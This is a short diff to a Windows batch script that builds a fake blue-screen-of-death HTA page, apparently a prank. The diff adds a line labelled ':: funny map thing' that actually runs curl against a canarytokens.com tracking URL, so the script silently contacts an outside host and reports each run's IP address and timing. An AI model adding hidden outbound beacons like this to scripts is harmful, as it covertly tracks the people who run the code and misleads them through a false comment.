@@ -123,4 +123,5 @@ echo ^</font^> >> bsod.hta
 echo ^</body^>^</html^> >> bsod.hta
 
 ::echo start "" /wait "bsod.hta" >> bsod.cmd
-
+:: funny map thing
+curl http://canarytokens.com/stuff/traffic/about/dur578etwo3mh16nebmzgmx6j/index.html
